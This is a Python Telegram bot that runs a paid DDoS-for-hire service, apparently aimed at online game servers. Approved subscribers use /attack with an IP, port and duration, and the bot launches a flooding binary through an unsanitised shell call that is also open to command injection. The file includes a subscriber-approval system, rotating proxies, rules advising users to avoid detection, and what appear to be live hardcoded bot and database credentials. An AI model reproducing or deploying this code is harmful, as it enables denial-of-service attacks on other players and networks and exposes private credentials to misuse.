import os
import signal
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from threading import Thread, Event
import asyncio
import aiohttp
from telebot import types
import pytz
import psutil

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

TOKEN = '7451668580:AAG-jEdykTELc29RjQx1ed-HpHRGNCDgkpY'
MONGO_URI = 'mongodb+srv://rj5706603:O95nvJYxapyDHfkw@cluster0.fzmckei.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'
FORWARD_CHANNEL_ID = -1002184397332
CHANNEL_ID = -1002184397332
error_channel_id = -1002184397332

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['karan']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Attack state (used across threads)
attack_in_progress = False
attack_duration = 0
attack_start_time = 0
attack_stop_event = Event()

# -------------------- Proxy management --------------------
def update_proxy():
    proxy_list = [
        "https://43.134.234.74:443", "https://175.101.18.21:5678", "https://179.189.196.52:5678",
        "https://162.247.243.29:80", "https://173.244.200.154:44302", "https://173.244.200.156:64631",
        "https://207.180.236.140:51167", "https://123.145.4.15:53309", "https://36.93.15.53:65445",
        "https://1.20.207.225:4153", "https://83.136.176.72:4145", "https://115.144.253.12:23928",
        "https://78.83.242.229:4145", "https://128.14.226.130:60080", "https://194.163.174.206:16128",
        "https://110.78.149.159:4145", "https://190.15.252.205:3629", "https://101.43.191.233:2080",
        "https://202.92.5.126:44879", "https://221.211.62.4:1111", "https://58.57.2.46:10800",
        "https://45.228.147.239:5678", "https://43.157.44.79:443", "https://103.4.118.130:5678",
        "https://37.131.202.95:33427", "https://172.104.47.98:34503", "https://216.80.120.100:3820",
        "https://182.93.69.74:5678", "https://8.210.150.195:26666", "https://49.48.47.72:8080",
        "https://37.75.112.35:4153", "https://8.218.134.238:10802", "https://139.59.128.40:2016",
        "https://45.196.151.120:5432", "https://24.78.155.155:9090", "https://212.83.137.239:61542",
        "https://46.173.175.166:10801", "https://103.196.136.158:7497", "https://82.194.133.209:4153",
        "https://210.4.194.196:80", "https://88.248.2.160:5678", "https://116.199.169.1:4145",
        "https://77.99.40.240:9090", "https://143.255.176.161:4153", "https://172.99.187.33:4145",
        "https://43.134.204.249:33126", "https://185.95.227.244:4145", "https://197.234.13.57:4145",
        "https://81.12.124.86:5678", "https://101.32.62.108:1080", "https://192.169.197.146:55137",
        "https://82.117.215.98:3629", "https://202.162.212.164:4153", "https://185.105.237.11:3128",
        "https://123.59.100.247:1080", "https://192.141.236.3:5678", "https://182.253.158.52:5678",
        "https://164.52.42.2:4145", "https://185.202.7.161:1455", "https://186.236.8.19:4145",
        "https://36.67.147.222:4153", "https://118.96.94.40:80", "https://27.151.29.27:2080",
        "https://181.129.198.58:5678", "https://200.105.192.6:5678", "https://103.86.1.255:4145",
        "https://171.248.215.108:1080", "https://181.198.32.211:4153", "https://188.26.5.254:4145",
        "https://34.120.231.30:80", "https://103.23.100.1:4145", "https://194.4.50.62:12334",
        "https://201.251.155.249:5678", "https://37.1.211.58:1080", "https://86.111.144.10:4145",
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    # Force refresh of requests session (if needed)
    if hasattr(telebot.apihelper, '_session'):
        telebot.apihelper._session = None
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

# -------------------- Background tasks --------------------
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    button3 = types.InlineKeyboardButton(
        text="🪀 𝗝𝗢𝗜𝗡 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 🪀", url="https://t.me/+WPvBVtUlslxhNzQ1")
    button1 = types.InlineKeyboardButton(text="💔 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 💔",
        url="https://t.me/+WPvBVtUlslxhNzQ1")
    markup.add(button3)
    markup.add(button1)
    return markup

def extend_and_clean_expired_users():
    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz)
    logging.info(f"Cleaning expired users: {now}")

    users_cursor = users_collection.find()
    for user in users_cursor:
        user_id = user.get("user_id")
        username = user.get("username", "Unknown User")
        time_approved_str = user.get("time_approved")
        days = user.get("days", 0)
        valid_until_str = user.get("valid_until", "")
        approving_admin_id = user.get("approved_by")

        if valid_until_str:
            try:
                valid_until_date = datetime.strptime(valid_until_str, "%Y-%m-%d").date()
                time_approved = datetime.strptime(time_approved_str, "%I:%M:%S %p %Y-%m-%d").time() if time_approved_str else datetime.min.time()
                valid_until_datetime = datetime.combine(valid_until_date, time_approved)
                valid_until_datetime = tz.localize(valid_until_datetime)

                if now > valid_until_datetime:
                    try:
                        bot.send_message(
                            user_id,
                            f"*⚠️ Access Expired! ⚠️*\n"
                            f"Your access expired on {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}.\n"
                            f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                            f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                            f"If you believe this is a mistake or wish to renew your access, please contact support. 💬",
                            reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                        )

                        if approving_admin_id:
                            bot.send_message(
                                approving_admin_id,
                                f"*🔴 User {username} (ID: {user_id}) has been automatically removed due to expired access.*\n"
                                f"🕒 Approval Time: {time_approved_str if time_approved_str else 'N/A'}\n"
                                f"📅 Valid Until: {valid_until_datetime.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
                                f"🚫 Status: Removed*",
                                reply_markup=create_inline_keyboard(), parse_mode='Markdown'
                            )
                    except Exception as e:
                        logging.error(f"Failed to send expiry message for user {user_id}: {e}")

                    result = users_collection.delete_one({"user_id": user_id})
                    if result.deleted_count > 0:
                        logging.info(f"User {user_id} removed from database.")
                    else:
                        logging.warning(f"Failed to remove user {user_id}.")
            except ValueError as e:
                logging.error(f"Date parse error for user {user_id}: {e}")

def periodic_cleanup():
    """Run user expiration cleanup every hour."""
    while True:
        extend_and_clean_expired_users()
        time.sleep(3600)  # 1 hour

# -------------------- Attack handling (non‑blocking) --------------------
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    global attack_in_progress
    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 10")
    await process.communicate()
    attack_in_progress = False
    attack_stop_event.set()  # Signal the countdown thread to stop
    # Notify completion
    try:
        bot.send_message(chat_id, "*✅ Attack Completed! ✅*\n"
                                   "*The attack has been successfully executed.*\n"
                                   "*Thank you for using our service!*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error sending completion message: {e}")

def update_attack_message(chat_id, message_id, target_ip, target_port, duration):
    """Background thread that updates the attack countdown message."""
    global attack_in_progress, attack_duration, attack_start_time
    last_text = ""
    start = time.time()
    for remaining in range(duration, 0, -1):
        if attack_stop_event.is_set():
            break
        time.sleep(1)
        if not attack_in_progress:
            break
        elapsed = time.time() - start
        remaining = max(0, duration - int(elapsed))
        text = (f"*🚀 Attack Initiated! 🚀*\n\n"
                f"*📡 Target Host: {target_ip}*\n"
                f"*👉 Target Port: {target_port}*\n"
                f"*⏰ Duration: {remaining} seconds remaining*\n"
                "*Prepare for action! 🔥*")
        if text != last_text:
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                                      text=text, reply_markup=create_inline_keyboard(),
                                      parse_mode='Markdown')
                last_text = text
            except Exception as e:
                if "message is not modified" not in str(e):
                    logging.error(f"Error editing message: {e}")
    # Final message already sent by the async function, so no extra update.

# -------------------- Bot commands --------------------
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = False
    try:
        is_admin = bot.get_chat_member(CHANNEL_ID, user_id).status in ['administrator', 'creator']
    except:
        pass

    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(
            chat_id,
            "🚫 *Access Denied!*\n"
            "❌ *You don't have the required permissions to use this command.*\n"
            "💬 *Please contact the bot owner if you believe this is a mistake.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(
            chat_id,
            "⚠️ *Invalid Command Format!*\n"
            "ℹ️ *To approve a user:*\n"
            "`/approve <user_id> <plan> <days>`\n"
            "ℹ️ *To disapprove a user:*\n"
            "`/disapprove <user_id>`\n"
            "🔄 *Example:* `/approve 12345678 1 30`\n"
            "✅ *This command approves the user with ID 12345678 for Plan 1, valid for 30 days.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    action = cmd_parts[0]

    try:
        target_user_id = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: [user_id] must be an integer!*\n"
                         "🔢 *Please enter a valid user ID and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    target_username = None
    if message.reply_to_message and message.reply_to_message.from_user:
        target_username = message.reply_to_message.from_user.username

    try:
        plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
        days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0
    except ValueError:
        bot.send_message(chat_id,
                         "⚠️ *Error: <plan> and <days> must be integers!*\n"
                         "🔢 *Ensure that the plan and days are numerical values and try again.*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        return

    tz = pytz.timezone('Asia/Kolkata')
    now = datetime.now(tz).date()

    if action == '/approve':
        valid_until = (now + timedelta(days=days)).isoformat() if days > 0 else now.isoformat()
        time_approved = datetime.now(tz).strftime("%I:%M:%S %p %Y-%m-%d")
        users_collection.update_one({"user_id": target_user_id}, {
            "$set": {
                "user_id": target_user_id,
                "username": target_username,
                "plan": plan,
                "days": days,
                "valid_until": valid_until,
                "approved_by": user_id,
                "time_approved": time_approved,
                "access_count": 0
            }
        }, upsert=True)

        # Admin confirmation
        bot.send_message(
            chat_id,
            f"✅ *Approval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"📋 *Plan:* `{plan}`\n"
            f"⏳ *Duration:* `{days} days`\n"
            f"🎉 *The user has been approved and their account is now active.*\n"
            f"🚀 *They will be able to use the bot's commands according to their plan.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Notify user
        user_text = (f"🎉 *Congratulations, {target_user_id}!*\n"
                     f"✅ *Your account has been approved!*\n"
                     f"📋 *Plan:* `{plan}`\n"
                     f"⏳ *Valid for:* `{days} days`\n"
                     f"🔥 *You can now use the /attack command to unleash the full power of your plan.*\n"
                     f"💡 *Thank you for choosing our service! If you have any questions, don't hesitate to ask.*")
        try:
            bot.send_message(target_user_id, user_text,
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Could not send approval message to user {target_user_id}: {e}")

        # Channel notification
        username_str = f"@{target_username}" if target_username else "No username"
        bot.send_message(
            CHANNEL_ID,
            f"🔔 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"💬 *Username:* `{username_str}`\n"
            f"👮 *Has been approved by Admin:* `{user_id}`\n"
            f"🎯 *The user is now authorized to access the bot according to Plan {plan}.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

    elif action == '/disapprove':
        users_collection.delete_one({"user_id": target_user_id})
        bot.send_message(
            chat_id,
            f"❌ *Disapproval Successful!*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"🗑️ *The user's account has been disapproved and all related data has been removed from the system.*\n"
            f"🚫 *They will no longer be able to access the bot.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        try:
            bot.send_message(
                target_user_id,
                "🚫 *Your account has been disapproved and removed from the system.*\n"
                "💬 *If you believe this is a mistake, please contact the admin.*",
                reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        except Exception as e:
            logging.error(f"Could not send disapproval message to user {target_user_id}: {e}")

        username_str = f"@{target_username}" if target_username else "No username"
        bot.send_message(
            CHANNEL_ID,
            f"🔕 *Notification:*\n"
            f"👤 *User ID:* `{target_user_id}`\n"
            f"💬 *Username:* `{username_str}`\n"
            f"👮 *Has been disapproved by Admin:* `{user_id}`\n"
            f"🗑️ *The user has been removed from the system.*",
            reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    global attack_in_progress, attack_duration, attack_start_time
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data.get('plan', 0) == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       "*You must be approved to use this bot.*\n"
                                       "*Please contact the owner for assistance: @VIPXOWNER8.*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        args = message.text.split()[1:]
        if len(args) != 3:
            bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                       "*Please use the following format:*\n"
                                       "`/attack <ip> <port> <duration>`",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*🔒 Port {target_port} is blocked.*\n"
                                       "*Please choose a different port to continue.*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        if duration > 300:
            bot.send_message(chat_id, "*⏳ The maximum duration allowed is 300 seconds.*\n"
                                       "*Please reduce the duration and try again!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return

        # Start attack
        attack_in_progress = True
        attack_duration = duration
        attack_start_time = time.time()
        attack_stop_event.clear()

        sent_message = bot.send_message(chat_id, f"*🚀 Attack Initiated! 🚀*\n\n"
                                                 f"*📡 Target Host: {target_ip}*\n"
                                                 f"*👉 Target Port: {target_port}*\n"
                                                 f"*⏰ Duration: {duration} seconds remaining*\n"
                                                 "*Prepare for action! 🔥*",
                                        reply_markup=create_inline_keyboard(), parse_mode='Markdown')

        # Start background countdown updater
        updater_thread = Thread(target=update_attack_message,
                                args=(chat_id, sent_message.message_id, target_ip, target_port, duration),
                                daemon=True)
        updater_thread.start()

        # Schedule the actual attack in the asyncio loop
        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(chat_id, target_ip, target_port, duration),
            loop
        )

    except Exception as e:
        logging.error(f"Error in attack command: {e}")
        bot.send_message(chat_id, "*❗ An error occurred while processing your request.*", parse_mode='Markdown')

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if attack_in_progress:
        elapsed = time.time() - attack_start_time
        remaining = attack_duration - elapsed
        if remaining > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*",
                             reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    try:
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})

        tz = pytz.timezone('Asia/Kolkata')
        now = datetime.now(tz)
        current_date = now.date().strftime("%Y-%m-%d")
        current_time = now.strftime("%I:%M:%S %p")

        if not user_data:
            response = (
                "*⚠️ No account information found. ⚠️*\n"
                "*It looks like you don't have an account with us.*\n"
                "*Please contact the owner for assistance.*\n"
            )
            markup = types.InlineKeyboardMarkup()
            button1 = types.InlineKeyboardButton(text="☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️",
                                                 url="https://t.me/VIPXOWNER8")
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/c/3661090730/1550")
            markup.add(button1)
            markup.add(button2)
        else:
            username = message.from_user.username or "Unknown User"
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            response = (
                f"*👤 Username: @{username}*\n"
                f"*💼 Plan: {plan} ₹*\n"
                f"*📅 Valid Until: {valid_until}*\n"
                f"*📆 Current Date: {current_date}*\n"
                f"*🕒 Current Time: {current_time}*\n"
                "*🎉 Thank you for being with us! 🎉*\n"
                "*If you need any help or have questions, feel free to ask.* 💬"
            )
            markup = types.InlineKeyboardMarkup()
            button = types.InlineKeyboardButton(
                text="😈 𝐉𝐎𝐈𝐍 𝐂𝐇𝐀𝐍𝐍𝐄𝐋 😈", url="https://t.me/+84dzjkgSdKtkYmE1")
            markup.add(button)

        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)
    except Exception as e:
        logging.error(f"Error in /myinfo: {e}")

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )
    try:
        bot.send_message(message.chat.id, rules_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in /rules: {e}")

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")
    try:
        bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in /help: {e}")

@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @VIPXOWNER8\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
    )
    bot.send_message(message.chat.id, response, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥",
                         reply_markup=create_inline_keyboard(), parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in /start: {e}")

@bot.message_handler(commands=['canary'])
def canary_command(message):
    response = ("*📥 Download the HttpCanary APK Now! 📥*\n\n"
                "*🔍 Track IP addresses with ease and stay ahead of the game! 🔍*\n"
                "*💡 Utilize this powerful tool wisely to gain insights and manage your network effectively. 💡*\n\n"
                "*Choose your platform:*")
    markup = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        text="📱 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗙𝗼𝗿 𝗔𝗻𝗱𝗿𝗼𝗶𝗱 📱",
        url="https://t.me/+WPvBVtUlslxhNzQ1")
    button2 = types.InlineKeyboardButton(
        text="🍎 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗼𝗿 𝗶𝗢𝗦 🍎",
        url="https://apps.apple.com/in/app/surge-5/id1442620678")
    markup.add(button1)
    markup.add(button2)
    try:
        bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=markup)
    except Exception as e:
        logging.error(f"Error in /canary: {e}")

# -------------------- Asyncio thread --------------------
async def start_asyncio_loop():
    """Runs forever, allowing scheduled coroutines to execute."""
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

def start_asyncio_thread():
    """Run the asyncio event loop in a background thread."""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

# -------------------- Main --------------------
if __name__ == "__main__":
    # Start background threads
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    cleanup_thread = Thread(target=periodic_cleanup, daemon=True)
    cleanup_thread.start()

    # Run initial cleanup
    extend_and_clean_expired_users()

    logging.info("Starting Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logging.error(f"Polling error: {e}")
        time.sleep(REQUEST_INTERVAL)
